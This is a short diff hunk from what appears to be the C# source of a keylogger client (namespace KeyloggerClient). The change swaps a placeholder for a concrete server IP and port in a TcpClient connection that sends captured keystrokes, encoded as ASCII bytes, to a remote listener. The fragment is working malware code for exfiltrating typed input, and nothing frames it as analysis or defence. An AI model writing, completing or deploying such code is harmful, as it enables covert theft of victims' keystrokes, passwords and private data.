@@ -45,7 +45,7 @@ namespace KeyloggerClient
         {
             try
             {
-                using (TcpClient client = new TcpClient("server-ip-address", 5000)) // Use the server's IP address
+                using (TcpClient client = new TcpClient("192.168.237.109", 5000)) // Use the server's IP address
                 using (NetworkStream stream = client.GetStream())
                 {
                     byte[] data = System.Text.Encoding.ASCII.GetBytes(key);
